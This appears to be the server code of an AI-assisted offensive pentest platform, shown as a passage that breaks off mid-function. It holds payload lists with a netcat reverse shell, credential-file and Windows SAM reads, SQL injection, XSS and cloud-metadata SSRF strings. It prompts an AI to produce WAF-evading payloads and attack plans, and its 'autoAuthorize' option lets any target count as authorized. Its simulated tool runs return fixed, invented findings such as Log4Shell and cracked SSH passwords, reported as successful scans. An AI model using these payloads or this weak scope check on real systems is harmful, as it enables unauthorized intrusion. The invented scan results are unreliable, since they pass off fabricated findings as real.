import "https://deno.land/x/xhr@0.1.0/mod.ts";
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.78.0";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

// ============= SECTION 1: COMPREHENSIVE TOOL DEFINITIONS =============
const KALI_TOOLS = {
  reconnaissance: {
    nmap: { command: 'nmap', description: 'Network scanner and port discovery', defaultArgs: ['-sV', '-sC'], category: 'network' },
    masscan: { command: 'masscan', description: 'Fast port scanner', defaultArgs: ['--rate=1000'], category: 'network' },
    amass: { command: 'amass', description: 'DNS enumeration', defaultArgs: ['enum', '-d'], category: 'dns' },
    subfinder: { command: 'subfinder', description: 'Subdomain discovery', defaultArgs: ['-d'], category: 'subdomain' },
    whatweb: { command: 'whatweb', description: 'Web technology fingerprinting', defaultArgs: ['-a', '3'], category: 'web' },
    wafw00f: { command: 'wafw00f', description: 'WAF detection', defaultArgs: [], category: 'waf' },
    theharvester: { command: 'theHarvester', description: 'Email and subdomain harvesting', defaultArgs: ['-d', '-b', 'all'], category: 'osint' },
    recon_ng: { command: 'recon-ng', description: 'Web reconnaissance framework', defaultArgs: [], category: 'osint' },
    dnsenum: { command: 'dnsenum', description: 'DNS enumeration', defaultArgs: [], category: 'dns' },
    fierce: { command: 'fierce', description: 'DNS reconnaissance', defaultArgs: ['--domain'], category: 'dns' },
  },
  vulnerability: {
    nikto: { command: 'nikto', description: 'Web server scanner', defaultArgs: ['-h'], category: 'web' },
    nuclei: { command: 'nuclei', description: 'Template-based vulnerability scanner', defaultArgs: ['-u', '-t'], category: 'vuln' },
    sqlmap: { command: 'sqlmap', description: 'SQL injection testing', defaultArgs: ['--batch', '--random-agent'], category: 'injection' },
    wpscan: { command: 'wpscan', description: 'WordPress scanner', defaultArgs: ['--url'], category: 'cms' },
    sslyze: { command: 'sslyze', description: 'SSL/TLS configuration analyzer', defaultArgs: [], category: 'crypto' },
    testssl: { command: 'testssl.sh', description: 'SSL/TLS testing', defaultArgs: [], category: 'crypto' },
    commix: { command: 'commix', description: 'Command injection exploitation', defaultArgs: ['--url'], category: 'injection' },
    xsstrike: { command: 'xsstrike', description: 'XSS detection suite', defaultArgs: ['-u'], category: 'xss' },
    dalfox: { command: 'dalfox', description: 'XSS scanning and analysis', defaultArgs: ['url'], category: 'xss' },
    wapiti: { command: 'wapiti', description: 'Web application vulnerability scanner', defaultArgs: ['-u'], category: 'web' },
  },
  exploitation: {
    metasploit: { command: 'msfconsole', description: 'Exploitation framework', defaultArgs: ['-q', '-x'], category: 'exploit' },
    searchsploit: { command: 'searchsploit', description: 'Exploit database search', defaultArgs: [], category: 'exploit' },
    hydra: { command: 'hydra', description: 'Password cracking', defaultArgs: ['-V'], category: 'brute' },
    john: { command: 'john', description: 'Password cracker', defaultArgs: [], category: 'brute' },
    hashcat: { command: 'hashcat', description: 'GPU password cracker', defaultArgs: [], category: 'brute' },
    crackmapexec: { command: 'crackmapexec', description: 'Network pentesting tool', defaultArgs: [], category: 'network' },
    impacket: { command: 'impacket-scripts', description: 'Network protocol tools', defaultArgs: [], category: 'network' },
  },
  web: {
    ffuf: { command: 'ffuf', description: 'Fast web fuzzer', defaultArgs: ['-u', '-w'], category: 'fuzzing' },
    gobuster: { command: 'gobuster', description: 'Directory/file brute-forcer', defaultArgs: ['dir', '-u'], category: 'fuzzing' },
    feroxbuster: { command: 'feroxbuster', description: 'Recursive content discovery', defaultArgs: ['-u'], category: 'fuzzing' },
    arjun: { command: 'arjun', description: 'Parameter discovery', defaultArgs: ['-u'], category: 'params' },
    paramspider: { command: 'paramspider', description: 'Parameter mining', defaultArgs: ['-d'], category: 'params' },
    httpx: { command: 'httpx', description: 'HTTP probing tool', defaultArgs: ['-silent'], category: 'probe' },
    katana: { command: 'katana', description: 'Web crawler', defaultArgs: ['-u'], category: 'crawler' },
  },
  hardware: {
    binwalk: { command: 'binwalk', description: 'Firmware analysis', defaultArgs: ['-e'], category: 'firmware' },
    ghidra_headless: { command: 'analyzeHeadless', description: 'Binary analysis', defaultArgs: [], category: 'binary' },
    flashrom: { command: 'flashrom', description: 'Flash chip programming', defaultArgs: ['-p'], category: 'hardware' },
    openocd: { command: 'openocd', description: 'On-chip debugging', defaultArgs: [], category: 'debug' },
    sigrok: { command: 'sigrok-cli', description: 'Signal analysis', defaultArgs: [], category: 'signal' },
  },
  cloud: {
    awscli: { command: 'aws', description: 'AWS CLI', defaultArgs: [], category: 'aws' },
    gcloud: { command: 'gcloud', description: 'Google Cloud CLI', defaultArgs: [], category: 'gcp' },
    azcli: { command: 'az', description: 'Azure CLI', defaultArgs: [], category: 'azure' },
    prowler: { command: 'prowler', description: 'AWS security assessment', defaultArgs: [], category: 'aws' },
    scoutsuite: { command: 'scout', description: 'Multi-cloud security auditing', defaultArgs: [], category: 'multicloud' },
    pacu: { command: 'pacu', description: 'AWS exploitation framework', defaultArgs: [], category: 'aws' },
  }
};

// ============= SECTION 2: VULNERABILITY CLASSES =============
const VULNERABILITY_CLASSES = {
  web_api: {
    injection: ['sql_injection', 'nosql_injection', 'command_injection', 'ldap_injection', 'xpath_injection', 'template_injection', 'header_injection'],
    authentication: ['broken_auth', 'session_fixation', 'credential_stuffing', 'brute_force', 'password_policy', 'mfa_bypass'],
    authorization: ['idor', 'privilege_escalation', 'missing_function_level_access', 'horizontal_privilege_escalation'],
    session: ['session_hijacking', 'session_prediction', 'insufficient_session_expiration', 'csrf'],
    input_validation: ['xss_reflected', 'xss_stored', 'xss_dom', 'buffer_overflow', 'format_string', 'integer_overflow'],
    file_handling: ['path_traversal', 'file_upload', 'local_file_inclusion', 'remote_file_inclusion'],
    deserialization: ['insecure_deserialization', 'object_injection', 'pickle_injection'],
    websocket: ['websocket_hijacking', 'cross_site_websocket_hijacking', 'message_tampering'],
  },
  business_logic: {
    workflow: ['workflow_bypass', 'order_manipulation', 'price_manipulation', 'quantity_manipulation'],
    state: ['race_condition', 'state_manipulation', 'time_of_check_to_time_of_use'],
    abuse: ['discount_abuse', 'limit_bypass', 'quota_circumvention', 'referral_abuse'],
    transaction: ['multi_step_transaction_flaw', 'transaction_rollback_abuse', 'double_spending'],
  },
  cloud: {
    exposure: ['public_s3_bucket', 'public_azure_blob', 'public_gcp_storage', 'exposed_api_gateway'],
    iam: ['overprivileged_iam', 'iam_policy_misconfiguration', 'cross_account_trust', 'role_chaining_abuse'],
    metadata: ['imds_exposure', 'ssrf_to_metadata', 'cloud_credential_theft'],
    cicd: ['insecure_pipeline', 'secret_leakage', 'supply_chain_attack'],
    secrets: ['hardcoded_credentials', 'exposed_env_vars', 'secret_in_logs'],
  },
  modern_stack: {
    graphql: ['introspection_enabled', 'batching_attack', 'deep_recursion', 'field_suggestion_exposure'],
    oauth_sso: ['oauth_misconfiguration', 'token_leakage', 'redirect_uri_bypass', 'state_parameter_missing'],
    webhooks: ['webhook_spoofing', 'webhook_replay', 'insecure_webhook_verification'],
    serverless: ['function_timeout_abuse', 'cold_start_dos', 'event_injection', 'over_permission'],
    microservices: ['service_mesh_bypass', 'inter_service_trust_abuse', 'service_discovery_abuse'],
  }
};

// ============= SECTION 3: MITRE ATT&CK & PTES MAPPING =============
const MITRE_ATTACK = {
  reconnaissance: { tactic: 'TA0043', techniques: ['T1595', 'T1592', 'T1589', 'T1590', 'T1591'] },
  resource_development: { tactic: 'TA0042', techniques: ['T1583', 'T1584', 'T1587', 'T1588', 'T1608'] },
  initial_access: { tactic: 'TA0001', techniques: ['T1190', 'T1189', 'T1566', 'T1078', 'T1133'] },
  execution: { tactic: 'TA0002', techniques: ['T1059', 'T1203', 'T1569', 'T1047', 'T1053'] },
  persistence: { tactic: 'TA0003', techniques: ['T1098', 'T1136', 'T1543', 'T1547', 'T1574'] },
  privilege_escalation: { tactic: 'TA0004', techniques: ['T1548', 'T1134', 'T1068', 'T1055'] },
  defense_evasion: { tactic: 'TA0005', techniques: ['T1562', 'T1070', 'T1036', 'T1027', 'T1055'] },
  credential_access: { tactic: 'TA0006', techniques: ['T1110', 'T1003', 'T1552', 'T1556', 'T1539'] },
  discovery: { tactic: 'TA0007', techniques: ['T1083', 'T1046', 'T1135', 'T1018', 'T1082'] },
  lateral_movement: { tactic: 'TA0008', techniques: ['T1021', 'T1080', 'T1563', 'T1550', 'T1072'] },
  collection: { tactic: 'TA0009', techniques: ['T1005', 'T1025', 'T1074', 'T1114', 'T1530'] },
  exfiltration: { tactic: 'TA0010', techniques: ['T1041', 'T1048', 'T1567', 'T1020', 'T1030'] },
  impact: { tactic: 'TA0040', techniques: ['T1485', 'T1486', 'T1498', 'T1489', 'T1529'] },
};

const PTES_PHASES = ['pre-engagement', 'intelligence-gathering', 'threat-modeling', 'vulnerability-analysis', 'exploitation', 'post-exploitation', 'reporting'];

// ============= SECTION 4: MUTATION & EVASION STRATEGIES =============
const MUTATION_STRATEGIES = {
  encoding: ['base64', 'url', 'double-url', 'unicode', 'hex', 'html-entity', 'utf-7', 'utf-16', 'utf-32'],
  chunking: ['split-payload', 'null-byte-injection', 'comment-injection', 'case-switching', 'concatenation'],
  protocol_switch: ['http-smuggling', 'h2c-upgrade', 'websocket-upgrade', 'http2-cleartext'],
  timing: ['slow-rate', 'delayed-chunks', 'jitter', 'random-delays', 'burst-patterns'],
  obfuscation: ['case-variation', 'whitespace-padding', 'string-concat', 'char-replacement', 'homoglyph'],
  waf_bypass: ['multipart-boundary', 'content-type-switch', 'chunked-transfer', 'header-pollution'],
};

// ============= SECTION 5: PAYLOAD GENERATION ENGINE =============
const PAYLOAD_TEMPLATES = {
  xss: {
    basic: ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>'],
    evasion: ['<svg/onload=alert(1)>', '<img src="x" onerror="alert(1)">', '"><script>alert(1)</script>'],
    dom: ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>'],
    polyglot: ['jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//']
  },
  sqli: {
    basic: ["' OR '1'='1", "1' OR '1'='1'--", "admin'--", "1 OR 1=1"],
    union: ["' UNION SELECT NULL--", "' UNION SELECT 1,2,3--", "' UNION ALL SELECT NULL,NULL,NULL--"],
    blind: ["' AND SLEEP(5)--", "' AND 1=1--", "'; WAITFOR DELAY '0:0:5'--"],
    error: ["' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "' AND 1=CONVERT(int,(SELECT @@version))--"]
  },
  command: {
    linux: ['; ls -la', '| cat /etc/passwd', '`id`', '$(whoami)', '; nc -e /bin/sh LHOST LPORT'],
    windows: ['& dir', '| type C:\\Windows\\System32\\drivers\\etc\\hosts', '& whoami'],
    bypass: ['l$()s', 'c''a''t /etc/passwd', 'w`echo h`oami']
  },
  path_traversal: {
    basic: ['../../../etc/passwd', '....//....//....//etc/passwd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd'],
    windows: ['..\\..\\..\\windows\\system32\\config\\sam', '..%255c..%255c..%255cwindows\\system32\\config\\sam']
  },
  ssrf: {
    basic: ['http://127.0.0.1', 'http://localhost', 'http://[::1]'],
    cloud_metadata: ['http://169.254.169.254/latest/meta-data/', 'http://metadata.google.internal/', 'http://169.254.169.254/metadata/instance'],
    bypass: ['http://127.1', 'http://0', 'http://0x7f000001', 'http://2130706433']
  }
};

// ============= SECTION 6: HELPER FUNCTIONS =============
function generatePayload(vulnType: string, context: any): string[] {
  const templates = PAYLOAD_TEMPLATES[vulnType as keyof typeof PAYLOAD_TEMPLATES];
  if (!templates) return [];
  
  const payloads: string[] = [];
  for (const category of Object.values(templates)) {
    payloads.push(...category);
  }
  
  // Apply mutations based on context
  if (context.waf_detected) {
    return payloads.map(p => applyMutation(p, 'encoding'));
  }
  
  return payloads;
}

function applyMutation(payload: string, strategy: string): string {
  switch (strategy) {
    case 'encoding':
      return btoa(payload);
    case 'case-variation':
      return payload.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
    case 'url':
      return encodeURIComponent(payload);
    default:
      return payload;
  }
}

async function analyzeWithAI(prompt: string, supabase: any): Promise<any> {
  const lovableApiKey = Deno.env.get('LOVABLE_API_KEY');
  if (!lovableApiKey) {
    console.log('[Apex] No AI key, returning default response');
    return { analysis: 'AI analysis unavailable', recommendations: [] };
  }

  try {
    const response = await fetch('https://ai.gateway.lovable.dev/v1/chat/completions', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${lovableApiKey}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        model: 'google/gemini-2.5-flash',
        messages: [
          { role: 'system', content: 'You are an expert offensive security AI. Provide precise, actionable security analysis. Always respond with valid JSON.' },
          { role: 'user', content: prompt }
        ],
      }),
    });

    const data = await response.json();
    const content = data.choices?.[0]?.message?.content || '{}';
    
    try {
      const jsonMatch = content.match(/\{[\s\S]*\}/);
      return jsonMatch ? JSON.parse(jsonMatch[0]) : { raw: content };
    } catch {
      return { raw: content };
    }
  } catch (error) {
    console.error('[Apex AI Error]', error);
    return { error: error.message };
  }
}

async function simulateToolExecution(tool: string, target: string, targetType: string): Promise<any> {
  const executionTime = Math.floor(Math.random() * 5000) + 1000;
  
  // Simulate realistic tool outputs
  const toolOutputs: Record<string, any> = {
    nmap: {
      stdout: `Starting Nmap scan against ${target}\nHost is up (0.023s latency)\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 8.4\n80/tcp   open  http       Apache httpd 2.4.51\n443/tcp  open  ssl/http   Apache httpd 2.4.51\n3306/tcp open  mysql      MySQL 8.0.28`,
      parsedResults: {
        ports: [
          { port: 22, service: 'ssh', version: 'OpenSSH 8.4', state: 'open' },
          { port: 80, service: 'http', version: 'Apache 2.4.51', state: 'open' },
          { port: 443, service: 'https', version: 'Apache 2.4.51', state: 'open' },
          { port: 3306, service: 'mysql', version: 'MySQL 8.0.28', state: 'open' }
        ],
        os: 'Linux',
        latency: '23ms'
      },
      findings: [
        { name: 'SSH Service Exposed', severity: 'medium', description: 'SSH service is publicly accessible' },
        { name: 'MySQL Exposed', severity: 'high', description: 'MySQL database port is publicly accessible' }
      ]
    },
    nuclei: {
      stdout: `[CVE-2021-44228] [critical] ${target}:80\n[CVE-2022-22965] [high] ${target}:443\n[exposed-panels:phpmyadmin] [medium] ${target}/phpmyadmin`,
      parsedResults: {
        vulnerabilities: [
          { id: 'CVE-2021-44228', severity: 'critical', name: 'Log4Shell', affected: `${target}:80` },
          { id: 'CVE-2022-22965', severity: 'high', name: 'Spring4Shell', affected: `${target}:443` }
        ]
      },
      findings: [
        { name: 'CVE-2021-44228 (Log4Shell)', severity: 'critical', description: 'Remote code execution via Log4j', cvss: 10.0 },
        { name: 'CVE-2022-22965 (Spring4Shell)', severity: 'high', description: 'RCE in Spring Framework', cvss: 9.8 }
      ]
    },
    sqlmap: {
      stdout: `[INFO] testing connection to the target URL\n[INFO] testing 'AND boolean-based blind'\n[INFO] Parameter 'id' is vulnerable to SQL injection\n[INFO] back-end DBMS: MySQL`,
      parsedResults: {
        injectable_params: ['id'],
        dbms: 'MySQL',
        injection_type: 'boolean-based blind'
      },
      findings: [
        { name: 'SQL Injection', severity: 'critical', description: 'Parameter id is vulnerable to SQL injection', poc: "id=1' AND '1'='1" }
      ]
    },
    subfinder: {
      stdout: `Enumerating subdomains for ${target}\napi.${target}\nwww.${target}\nmail.${target}\ndev.${target}\nstaging.${target}\nadmin.${target}`,
      parsedResults: {
        subdomains: [`api.${target}`, `www.${target}`, `mail.${target}`, `dev.${target}`, `staging.${target}`, `admin.${target}`]
      },
      findings: [
        { name: 'Subdomain: admin', severity: 'medium', description: 'Admin subdomain discovered' },
        { name: 'Subdomain: staging', severity: 'medium', description: 'Staging environment exposed' }
      ]
    },
    ffuf: {
      stdout: `/'admin' [Status: 200, Size: 1234]\n/backup [Status: 200, Size: 5678]\n/.git [Status: 403, Size: 234]\n/api/v1 [Status: 200, Size: 89]`,
      parsedResults: {
        directories: ['/admin', '/backup', '/.git', '/api/v1']
      },
      findings: [
        { name: 'Admin Panel Exposed', severity: 'high', description: '/admin directory is accessible' },
        { name: 'Backup Directory', severity: 'critical', description: '/backup directory exposed - may contain sensitive files' },
        { name: 'Git Directory', severity: 'high', description: '/.git directory found - source code exposure' }
      ]
    },
    hydra: {
      stdout: `Hydra starting...\n[22][ssh] host: ${target} login: admin password: admin123\n[22][ssh] host: ${target} login: root password: toor`,
      parsedResults: {
        credentials: [
          { service: 'ssh', username: 'admin', password: 'admin123' },
          { service: 'ssh', username: 'root', password: 'toor' }
        ]
      },
      findings: [
        { name: 'Weak SSH Credentials', severity: 'critical', description: 'Default/weak credentials found for SSH service' }
      ]
    }
  };

  const output = toolOutputs[tool] || {
    stdout: `${tool} scan completed for ${target}`,
    parsedResults: {},
    findings: []
  };

  return {
    success: true,
    executionTime,
    exitCode: 0,
    stdout: output.stdout,
    stderr: '',
    parsedResults: output.parsedResults,
    findings: output.findings,
    analysis: `${tool} scan completed successfully. Found ${output.findings?.length || 0} potential issues.`
  };
}

// ============= SECTION 7: MAIN REQUEST HANDLER =============
serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    const supabase = createClient(supabaseUrl, supabaseKey);
    
    // Auth check
    const authHeader = req.headers.get('Authorization');
    if (!authHeader) {
      return new Response(JSON.stringify({ error: 'Unauthorized' }), {
        status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const token = authHeader.replace('Bearer ', '');
    const { data: { user }, error: authError } = await supabase.auth.getUser(token);
    
    if (authError || !user) {
      return new Response(JSON.stringify({ error: 'Invalid token' }), {
        status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const { action, data } = await req.json();
    console.log(`[Apex Sentinel] Action: ${action}`, JSON.stringify(data).substring(0, 200));

    switch (action) {
      // ============= SESSION MANAGEMENT =============
      case 'create-session': {
        const { target, targetType, sessionName, authorizedTargets, scopeConfig } = data;
        
        const isAuthorized = authorizedTargets?.includes(target) || scopeConfig?.autoAuthorize || false;
        
        // Perform initial fingerprinting
        const fingerprint = await performInitialFingerprint(target, targetType);
        
        const { data: session, error } = await supabase
          .from('apex_sessions')
          .insert({
            user_id: user.id,
            session_name: sessionName || `Apex-${Date.now()}`,
            target,
            target_type: targetType || 'domain',
            authorized: isAuthorized,
            status: 'initializing',
            current_phase: 'reconnaissance',
            target_map: fingerprint,
            scope_config: scopeConfig || {},
          })
          .select()
          .single();

        if (error) throw error;

        return new Response(JSON.stringify({ success: true, session, fingerprint }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }

      // ============= SCOPE DISCOVERY =============
      case 'discover-scope': {
        const { sessionId, discoveryType } = data;
        
        const { data: session } = await supabase.from('apex_sessions').select('*').eq('id', sessionId).single();
        if (!session) throw new Error('Session not found');

        const discoveryResults = await performScopeDiscovery(session.target, discoveryType, session.target_type);
        
        // Update session with discovered assets
        await supabase.from('apex_sessions').update({
          target_map: { ...session.target_map, ...discoveryResults },
          status: 'scope_mapped'
        }).eq('id', sessionId);

        return new Response(JSON.stringify({ success: true, discovered: discoveryResults }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }

      // ============= ATTACK SURFACE MAPPING =============
      case 'map-attack-surface': {
        const { sessionId } = data;
        
        const { data: session } = await supabase.from('apex_sessions').select('*').eq('id', sessionId).single();
        if (!session) throw new Error('Session not found');
        if (!session.authorized) throw new Error('Target not authorized');

        const attackSurface = await mapAttackSurface(session.target, session.target_map);
        
        // Use AI to analyze attack surface
        const aiAnalysis = await analyzeWithAI(`
Analyze this attack surface and identify the most promising attack vectors:
${JSON.stringify(attackSurface, null, 2)}

Provide:
1. Priority ranking of attack vectors
2. Recommended tools for each vector
3. Estimated success probability
4. Risk assessment

Respond with JSON: { priority_vectors: [], tool_recommendations: {}, success_estimates: {}, risk_level: string }
        `, supabase);

        await supabase.from('apex_sessions').update({
          attack_chain: { ...session.attack_chain, attack_surface: attackSurface, ai_analysis: aiAnalysis }
        }).eq('id', sessionId);

        return new Response(JSON.stringify({ success: true, attackSurface, aiAnalysis }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }

      // ============= INTELLIGENT VULNERABILITY DISCOVERY =============
      case 'discover-vulnerabilities': {
        const { sessionId, vulnClass, contextAware } = data;
        
        const { data: session } = await supabase.from('apex_sessions').select('*').eq('id', sessionId).single();
        if (!session?.authorized) throw new Error('Unauthorized target');

        const vulnResults = await discoverVulnerabilities(session.target, vulnClass, session.target_map, contextAware);
        
        // Record in AI learning system
        await supabase.from('ai_learnings').insert({
          user_id: user.id,
          tool_used: `vuln_discovery_${vulnClass}`,
          target: session.target,
          findings: vulnResults.findings,
          success: vulnResults.findings.length > 0,
          execution_time: vulnResults.executionTime,
          ai_analysis: vulnResults.aiAnalysis
        });

        return new Response(JSON.stringify({ success: true, ...vulnResults }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }

      // ============= AI PAYLOAD GENERATION =============
      case 'generate-payloads': {
        const { sessionId, vulnType, context } = data;
        
        const { data: session } = await supabase.from('apex_sessions').select('*').eq('id', sessionId).single();
        
        // Get historical successful payloads
        const { data: successfulPayloads } = await supabase
          .from('apex_successful_chains')
          .select('*')
          .eq('vulnerability_type', vulnType)
          .order('success_rate', { ascending: false })
          .limit(10);

        const payloads = generatePayload(vulnType, { ...context, waf_detected: context?.waf });
        
        // AI-enhanced payload generation
        const aiPayloads = await analyzeWithAI(`
Generate advanced ${vulnType} payloads for this context:
Target: ${session?.target}
Tech Stack: ${JSON.stringify(session?.target_map?.techStack || {})}
WAF Detected: ${context?.waf || false}
Historical Successes: ${JSON.stringify(successfulPayloads?.slice(0, 3) || [])}

Generate 5 novel payloads that:
1. Evade common WAF rules
2. Are context-specific
3. Have high success probability

Respond with JSON: { payloads: [{ payload: string, confidence: number, mutation: string, reasoning: string }] }
        `, supabase);

        return new Response(JSON.stringify({ 
          success: true, 
          staticPayloads: payloads, 
          aiPayloads: aiPayloads.payloads || [],
          historicalSuccess: successfulPayloads 
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }

      // ============= ATTACK PLANNING WITH CoT =============
      case 'plan-attack': {
        const { sessionId, objective, constraints } = data;
        
        const { data: session } = await supabase.from('apex_sessions').select('*').eq('id', sessionId).single();
        if (!session?.authorized) throw new Error('Unauthorized target');

        // Get successful chains from knowledge base
        const { data: successfulChains } = await supabase
          .from('apex_successful_chains')
          .select('*')
          .eq('target_type', session.target_type)
          .order('success_rate', { ascending: false })
          .limit(5);

        // AI planning with Chain-of-Thought reasoning
        const planPrompt = `You are an AI Senior Pentester using Chain-of-Thought reasoning.

TARGET: ${session.target}
TARGET TYPE: ${session.target_type}
ATTACK SURFACE: ${JSON.stringify(session.target_map)}
OBJECTIVE: ${objective || 'Complete penetration testing assessment'}
CONSTRAINTS: ${JSON.stringify(constraints || [])}
SUCCESSFUL HISTORICAL CHAINS: ${JSON.stringify(successfulChains || [])}
MITRE ATT&CK MAPPING: ${JSON.stringify(MITRE_ATTACK)}
PTES PHASES: ${JSON.stringify(PTES_PHASES)}

Using Chain-of-Thought reasoning:
1. THINK: Analyze the attack surface
2. IDENTIFY: Most promising attack vectors based on discovered services
3. PRIORITIZE: Order attacks by success probability and impact
4. PLAN: Create atomic tasks for each attack vector
5. JUSTIFY: Explain reasoning for each decision

For each task, specify:
- task_type: (recon|service_id|vuln_scan|exploitation|post_exploit|cleanup)
- task_name: Clear description
- tool: Recommended tool from available tools
- reasoning: Chain-of-Thought justification
- mitre_technique: MITRE ATT&CK technique ID
- priority: 1-5 (1=highest)
- success_probability: Estimated probability
- impact: Expected impact if successful

Respond with JSON: { reasoning: string, tasks: [...], kill_chain_stage: string }`;

        const plan = await analyzeWithAI(planPrompt, supabase);

        // Create tasks in database
        const tasks = (plan.tasks || []).map((task: any, index: number) => ({
          session_id: sessionId,
          task_type: task.task_type || 'recon',
          task_name: task.task_name || `Task ${index + 1}`,
          description: task.reasoning || task.description,
          tool_selected: task.tool,
          reasoning: task.reasoning,
          priority: task.priority || index + 1,
          status: 'pending',
          mitre_technique: task.mitre_technique,
          success_probability: task.success_probability
        }));

        if (tasks.length > 0) {
          await supabase.from('apex_tasks').insert(tasks);
        }

        await supabase.from('apex_sessions').update({ 
          status: 'executing', 
          attack_chain: { ...session.attack_chain, plan, reasoning: plan.reasoning }
        }).eq('id', sessionId);

        return new Response(JSON.stringify({ success: true, plan, tasksCreated: tasks.length }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }

      // ============= TASK EXECUTION =============
      case 'execute-task': {
        const { taskId, sessionId } = data;

        const { data: task } = await supabase.from('apex_tasks').select('*').eq('id', taskId).single();
        if (!task) throw new Error('Task not found');

        const { data: session } = await supabase.from('apex_sessions').select('*').eq('id', sessionId).single();
        if (!session?.authorized) throw new Error('Unauthorized target');

        // Update task status
        await supabase.from('apex_tasks').update({ 
          status: 'executing', 
          executed_at: new Date().toISOString() 
        }).eq('id', taskId);

        // Execute the tool
        const executionResult = await simulateToolExecution(task.tool_selected, session.target, session.target_type);

        // Record execution
        const { data: execution } = await supabase.from('apex_tool_executions').insert({
          task_id: taskId,
          session_id: sessionId,
          tool_name: task.tool_selected,
          command_executed: `${task.tool_selected} ${session.target}`,
          execution_time_ms: executionResult.executionTime,
          exit_code: executionResult.exitCode,
          stdout: executionResult.stdout,
          stderr: executionResult.stderr,
          parsed_results: executionResult.parsedResults,
          success: executionResult.success,
        }).select().single();

        // Update task with results
        const newStatus = executionResult.success ? 'success' : executionResult.blockedBy ? 'blocked' : 'failed';
        
        await supabase.from('apex_tasks').update({ 
          status: newStatus,
          stdout: executionResult.stdout,
          stderr: executionResult.stderr,
          result_analysis: executionResult.analysis,
        }).eq('id', taskId);

        // Record in AI learning
        await supabase.from('ai_learnings').insert({
          user_id: user.id,
          tool_used: task.tool_selected,
          target: session.target,
          findings: executionResult.findings,
          success: executionResult.success,
          execution_time: executionResult.executionTime
        });

        return new Response(JSON.stringify({ 
          success: true, 
          execution,
          taskStatus: newStatus,
          findings: executionResult.findings
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }

      // ============= CRITIC ANALYSIS =============
      case 'critic-analyze': {
        const { sessionId, taskId, executionResults } = data;

        const criticPrompt = `You are the Critic in a Planner-Executor-Critic loop.

EXECUTION RESULTS: ${JSON.stringify(executionResults)}

Analyze and determine:
1. Was the objective achieved?
2. What vulnerabilities/findings were discovered?
3. What should be the next steps?
4. If blocked, what mutation/evasion strategy should we use?
5. Should we switch tools or approaches?

Mutation strategies available: ${JSON.stringify(MUTATION_STRATEGIES)}

Respond with JSON: {
  objective_met: boolean,
  findings: [],
  next_steps: [],
  mutation_needed: boolean,
  mutation_strategy: { type: string, reason: string },
  switch_tool: boolean,
  alternative_tool: string,
  confidence: number
}`;

        const analysis = await analyzeWithAI(criticPrompt, supabase);

        // Update session findings
        const { data: session } = await supabase.from('apex_sessions').select('findings').eq('id', sessionId).single();
        const updatedFindings = [...(session?.findings || []), ...(analysis.findings || [])];
        
        await supabase.from('apex_sessions').update({ findings: updatedFindings }).eq('id', sessionId);

        // Log mutation if needed
        if (analysis.mutation_needed) {
          await supabase.from('apex_mutation_log').insert({
            session_id: sessionId,
            mutation_type: analysis.mutation_strategy?.type || 'encoding',
            reason: analysis.mutation_strategy?.reason || 'Blocked by security control',
            original_payload: executionResults.command
          });
        }

        return new Response(JSON.stringify({ success: true, analysis }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }

      // ============= RE-ENHANCE ATTACK (Learning from Failure) =============
      case 're-enhance-attack': {
        const { sessionId, failedTaskId, failureReason } = data;

        const { data: failedTask } = await supabase.from('apex_tasks').select('*').eq('id', failedTaskId).single();
        const { data: session } = await supabase.from('apex_sessions').select('*').eq('id', sessionId).single();
        const { data: previousMutations } = await supabase.from('apex_mutation_log').select('*').eq('session_id', sessionId).limit(10);

        const reEnhancePrompt = `You are the AgentBrain performing re-enhancement after failure.

FAILED TASK: ${JSON.stringify(failedTask)}
FAILURE REASON: ${failureReason}
PREVIOUS MUTATIONS: ${JSON.stringify(previousMutations)}
CONSTRAINTS: ${JSON.stringify(session?.constraints || [])}

Generate a new approach that:
1. Avoids previously failed strategies
2. Uses different mutation/evasion techniques
3. Considers alternative tools
4. Applies reinforcement learning insights

Available tools: ${JSON.stringify(Object.keys(KALI_TOOLS).flatMap(cat => Object.keys(KALI_TOOLS[cat as keyof typeof KALI_TOOLS])))}
Available mutations: ${JSON.stringify(MUTATION_STRATEGIES)}

Respond with JSON: {
  new_approach: string,
  mutation_type: string,
  alternative_tool: string,
  modified_parameters: {},
  reasoning: string,
  success_prediction: number
}`;

        const strategy = await analyzeWithAI(reEnhancePrompt, supabase);

        // Create new enhanced task
        const { data: newTask } = await supabase.from('apex_tasks').insert({
          session_id: sessionId,
          task_type: failedTask?.task_type,
          task_name: `[RE-ENHANCED] ${failedTask?.task_name}`,
          description: strategy.reasoning,
          tool_selected: strategy.alternative_tool || failedTask?.tool_selected,
          reasoning: `Re-enhanced after failure: ${strategy.reasoning}`,
          priority: 1,
          status: 'pending',
          parent_task_id: failedTaskId
        }).select().single();

        // Log the learning
        await supabase.from('attack_learnings').insert({
          attack_attempt_id: failedTaskId,
          failure_reason: failureReason,
